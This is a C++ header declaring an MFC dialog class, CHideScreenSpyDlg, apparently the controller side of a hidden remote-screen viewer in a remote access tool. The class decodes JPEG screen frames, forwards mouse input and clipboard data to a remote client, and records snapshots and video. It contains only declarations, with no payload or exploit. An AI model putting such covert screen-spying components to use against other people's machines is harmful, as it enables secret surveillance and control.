#pragma once
#include "stdafx.h"
#include "../client/CursorInfo.h"
#include "../common/jpeglib.h"
#include "IOCPServer.h"
#include "VideoDlg.h"
#include "Resource.h"

/////////////////////////////////////////////////////////////////////////////
// CHideScreenSpyDlg dialog

#ifdef _WIN64
#ifdef _DEBUG
#pragma comment(lib, "jpeg\\turbojpeg_64_d.lib")
#else
#pragma comment(lib, "jpeg\\turbojpeg_64_r.lib")
#endif
#else
#ifdef _DEBUG
#pragma comment(lib, "jpeg\\turbojpeg_32_d.lib")
#else
#pragma comment(lib, "jpeg\\turbojpeg_32_r.lib")
#endif
#endif


class CHideScreenSpyDlg : public DialogBase {
    DECLARE_DYNAMIC(CHideScreenSpyDlg)
    enum { IDD = IDD_SCREEN };

public:
    CHideScreenSpyDlg(CWnd* pParent = NULL, Server* pIOCPServer = NULL, ClientContext* pContext = NULL);
    virtual ~CHideScreenSpyDlg();

	VOID SendNext(void) {
		BYTE	bToken = COMMAND_NEXT;
		m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);
	}
    void OnReceiveComplete();
	BOOL ParseFrame(void);
	void DrawFirstScreen(PBYTE pDeCompressionData, unsigned long destLen);
	void DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned long	destLen);
    void DrawNextScreenHome(PBYTE pDeCompressionData, unsigned long	destLen);
	void DrawTipString(CString str);

	void SendCommand(const MYMSG& pMsg);
	void SendScaledMouseMessage(MSG* pMsg, bool makeLP = false);
	void UpdateServerClipboard(char* buf, int len);
	void SendServerClipboard(void);
    bool SaveSnapshot(void);

    virtual void DoDataExchange(CDataExchange* pDX);
    virtual BOOL PreTranslateMessage(MSG* pMsg);
    virtual BOOL OnInitDialog();

    afx_msg void OnClose();
    afx_msg void OnPaint();
    afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnSize(UINT nType, int cx, int cy);

    virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);

    afx_msg void OnTimer(UINT_PTR nIDEvent);

    DECLARE_MESSAGE_MAP()

protected:
	void DoPaint();
    bool JPG_BMP(int cbit, void* input, int inlen, void* output);
    void ResetScreen();

	HDC                 m_hFullDC, m_hFullMemDC;
	HBITMAP	            m_BitmapHandle;
	LPVOID              m_BitmapData_Full;
	LPBITMAPINFO        m_BitmapInfor_Full;
	HCURSOR	            m_hRemoteCursor;
	CCursorInfo	        m_CursorInfo;
	BOOL                m_bIsFirst;
	BOOL                m_bIsCtrl;
    POINT               m_ClientCursorPos;
    BYTE                m_bCursorIndex;
	CString				m_strTip;

private:
	CString             m_aviFile;
	CBmpToAvi	        m_aviStream;
	CRect               m_CRect;
	RECT                m_rect;
	double              m_wZoom;
	double              m_hZoom;
	LPVOID	            m_lpvRectBits;
	LPBITMAPINFO        m_lpbmi_rect;
};
